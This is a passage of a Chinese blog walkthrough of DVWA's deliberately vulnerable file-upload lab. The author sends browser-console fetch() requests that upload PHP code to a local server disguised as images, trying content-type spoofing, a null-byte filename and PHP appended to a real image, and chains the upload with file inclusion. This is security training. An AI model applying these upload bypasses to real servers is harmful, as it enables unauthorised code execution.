&lt;span class="s2">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;multipart/form-data; boundary=---------------------------257607891334311387353687588123&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Upgrade-Insecure-Requests&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Dest&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;document&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;navigate&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Site&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;same-origin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-User&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;?1&amp;#34;&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="s2">&amp;#34;referrer&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/upload/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;body&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;MAX_FILE_SIZE\&amp;#34;\r\n\r\n100000\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;uploaded\&amp;#34;; filename=\&amp;#34;2.php\&amp;#34;\r\nContent-Type: image/jpeg\r\n\r\n&amp;lt;?php phpinfo(); ?&amp;gt;\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;Upload\&amp;#34;\r\n\r\nUpload\r\n-----------------------------257607891334311387353687588123--\r\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;method&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;POST&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;cors&amp;#34;&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后贴回浏览器控制台执行。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426163242992.png"
width="1236"
height="373"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426163242992_hue640e2923fb565d2fa9fc2b3061bf8de_44709_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426163242992_hue640e2923fb565d2fa9fc2b3061bf8de_44709_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426163242992"
class="gallery-image"
data-flex-grow="331"
data-flex-basis="795px"
>&lt;/p>
&lt;p>成功。&lt;/p>
&lt;h3 id="high难度">High难度&lt;/h3>
&lt;p>观察源码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Upload&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Where are we going to be writing to?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">DVWA_WEB_PAGE_TO_ROOT&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s2">&amp;#34;hackable/uploads/&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$target_path&lt;/span> &lt;span class="o">.=&lt;/span> &lt;span class="nx">basename&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// File information
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$uploaded_name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$uploaded_ext&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">substr&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">strrpos&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nv">$uploaded_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;size&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$uploaded_tmp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;tmp_name&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Is it an image?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">strtolower&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_ext&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;jpg&amp;#34;&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nx">strtolower&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_ext&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;jpeg&amp;#34;&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nx">strtolower&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_ext&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;png&amp;#34;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_size&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">100000&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;span class="nx">getimagesize&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_tmp&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Can we move the file to the upload folder?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nx">move_uploaded_file&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_tmp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$target_path&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// No
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Yes!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$target_path&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2"> succesfully uploaded!&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Invalid file
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded. We can only accept JPEG or PNG images.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意到改为使用文件后缀名判断，但取后缀名的逻辑有点意思：&lt;code>$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);&lt;/code>&lt;/p>
&lt;p>&lt;code>strrpos&lt;/code> 会返回最后一次出现&lt;code>.&lt;/code>的位置，然后&lt;code>substr&lt;/code>从这个位置+1截取字符串，比如&lt;code>1.jpg&lt;/code>就会取到&lt;code>jpg&lt;/code>。直觉告诉我可以转义或者&lt;code>%00&lt;/code>截断来解决这个问题，直接在 medium 难度的 payload 上改一改文件名&lt;code>1.php%00.jpg&lt;/code>，然后贴进控制台试试。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kr">await&lt;/span> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/upload/#&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;credentials&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;include&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;headers&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;User-Agent&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Accept&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Accept-Language&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;multipart/form-data; boundary=---------------------------257607891334311387353687588123&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Upgrade-Insecure-Requests&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Dest&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;document&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;navigate&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Site&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;same-origin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-User&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;?1&amp;#34;&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="s2">&amp;#34;referrer&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/upload/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;body&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;MAX_FILE_SIZE\&amp;#34;\r\n\r\n100000\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;uploaded\&amp;#34;; filename=\&amp;#34;3.php%00.jpg\&amp;#34;\r\nContent-Type: image/jpeg\r\n\r\n&amp;lt;?php phpinfo(); ?&amp;gt;\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;Upload\&amp;#34;\r\n\r\nUpload\r\n-----------------------------257607891334311387353687588123--\r\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;method&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;POST&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;cors&amp;#34;&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>观察响应发现不成功。直接放弃转义的想法，重新审阅下代码，没想出怎么直接 bypass 了。不过考虑是可以利用 apache 或者 nginx 的文件名解析漏洞，但我这个容器用了新版 apache 所以大概是不可行的=。=&lt;/p>
&lt;p>另一种解法是利用文件包含漏洞，这个比较容易，改一下上面的 payload 把文件名改成 &lt;code>3.jpg&lt;/code>。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kr">await&lt;/span> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/upload/#&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;credentials&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;include&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;headers&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;User-Agent&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Accept&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Accept-Language&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;multipart/form-data; boundary=---------------------------257607891334311387353687588123&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Upgrade-Insecure-Requests&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Dest&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;document&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;navigate&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Site&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;same-origin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-User&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;?1&amp;#34;&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="s2">&amp;#34;referrer&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/upload/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;body&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;MAX_FILE_SIZE\&amp;#34;\r\n\r\n100000\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;uploaded\&amp;#34;; filename=\&amp;#34;3.jpg\&amp;#34;\r\nContent-Type: image/jpeg\r\n\r\n&amp;lt;?php phpinfo(); ?&amp;gt;\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;Upload\&amp;#34;\r\n\r\nUpload\r\n-----------------------------257607891334311387353687588123--\r\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;method&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;POST&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;cors&amp;#34;&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>结果还是不行，重新审阅代码，注意到一个新出现的函数 &lt;code>getimagesize&lt;/code>，查询文档得知是获取图片大小的函数，可能会读取文件内容=，=而我的图片不是合法的图片所以就寄了。于是再改一改，直接这次把 payload 附加在正常图片后。不过这次选择的是 &lt;code>jpg&lt;/code> 后缀名和 &lt;code>svg&lt;/code> 文件内容（防止jpg图片的二进制数据把php解释器搞挂了）。payload 改成如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kr">await&lt;/span> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/upload/#&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;credentials&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;include&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;headers&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;User-Agent&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Accept&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Accept-Language&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;multipart/form-data; boundary=---------------------------257607891334311387353687588123&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Upgrade-Insecure-Requests&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Dest&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;document&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;navigate&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-Site&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;same-origin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Sec-Fetch-User&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;?1&amp;#34;&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="s2">&amp;#34;referrer&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/upload/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;body&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;MAX_FILE_SIZE\&amp;#34;\r\n\r\n100000\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;uploaded\&amp;#34;; filename=\&amp;#34;3.jpg\&amp;#34;\r\nContent-Type: image/jpeg\r\n\r\n&amp;lt;svg version=\&amp;#34;1.1\&amp;#34; id=\&amp;#34;Capa_1\&amp;#34; xmlns=\&amp;#34;http://www.w3.org/2000/svg\&amp;#34; xmlns:xlink=\&amp;#34;http://www.w3.org/1999/xlink\&amp;#34; x=\&amp;#34;0px\&amp;#34; y=\&amp;#34;0px\&amp;#34; width=\&amp;#34;400px\&amp;#34; height=\&amp;#34;738px\&amp;#34; viewBox=\&amp;#34;0 0 400 738\&amp;#34; enable-background=\&amp;#34;new 0 0 400 738\&amp;#34; xml:space=\&amp;#34;preserve\&amp;#34;&amp;gt;&amp;lt;/svg&amp;gt;&amp;lt;?php phpinfo(); ?&amp;gt;\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\&amp;#34;Upload\&amp;#34;\r\n\r\nUpload\r\n-----------------------------257607891334311387353687588123--\r\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;method&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;POST&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;mode&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;cors&amp;#34;&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后再提交，依然不行，淦。这次改成绝对正常的图片附带phpinfo。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426171159207.png"
width="301"
height="76"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426171159207_hu2c81a5a43d22aa3f29f5e3004ba5cfae_2122_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426171159207_hu2c81a5a43d22aa3f29f5e3004ba5cfae_2122_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426171159207"
class="gallery-image"
data-flex-grow="396"
data-flex-basis="950px"
>&lt;/p>
&lt;p>上传！失败而且发现一个警告：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">Warning: getimagesize(): Filename cannot be empty in /var/www/html/vulnerabilities/upload/source/high.php on line 17
&lt;/code>&lt;/pre>&lt;/div>&lt;p>调试 dvwa 代码后发现是 dvwa 代码里没检查错误，上传失败的原因是图片太大超过了表单限制=。=&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_size&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">100000&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="c1">// 实际上 php 在 $_FILES[ &amp;#39;uploaded&amp;#39; ][ &amp;#39;size&amp;#39; ] 设置的是 0，error 是 2
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">getimagesize&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_tmp&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>正确做法应该是先检查错误：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="p">(&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;error&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_size&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">100000&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;span class="nx">getimagesize&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_tmp&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>不然 &lt;code>$uploaded_tmp&lt;/code> 始终是空字符串的情况下，只会提示 &lt;code>filename cannot be empty&lt;/code> 就很不友好=。=我不确定这算不算 bug 但反正对我这样不太熟悉 php 的人不友好，强行 &lt;code>echo var_dump($_FILES[ 'uploaded' ]);&lt;/code> 才发现有个 &lt;code>error&lt;/code> 被设置成了 2。如果没有这个 &lt;code>error&lt;/code> 的话我可能就要懵上几天了。&lt;/p>
&lt;p>总之，发现问题原因之后，解决之。&lt;/p>
&lt;p>把图片放tinypng压缩一下（160k =&amp;gt; 6k），然后重新用正常图片带 payload，然后在文件包含这一节的漏洞包含这个png文件完成利用。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220427113343344.png"
width="1443"
height="682"
